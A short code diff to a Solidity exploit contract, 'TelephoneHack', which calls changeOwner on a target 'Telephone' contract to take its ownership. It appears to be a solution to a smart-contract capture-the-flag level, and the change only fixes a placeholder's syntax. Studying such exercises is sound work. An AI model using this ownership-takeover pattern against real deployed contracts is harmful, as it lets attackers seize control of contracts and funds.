@@ -16,7 +16,7 @@ contract Telephone {
 }
 
 contract TelephoneHack {
-    Telephone ogContract = Telephone(*your instance address*);
+    Telephone ogContract = Telephone(/*your instance address*/);
     
     function callChangeOwner(address attacker) public {
         ogContract.changeOwner(attacker);
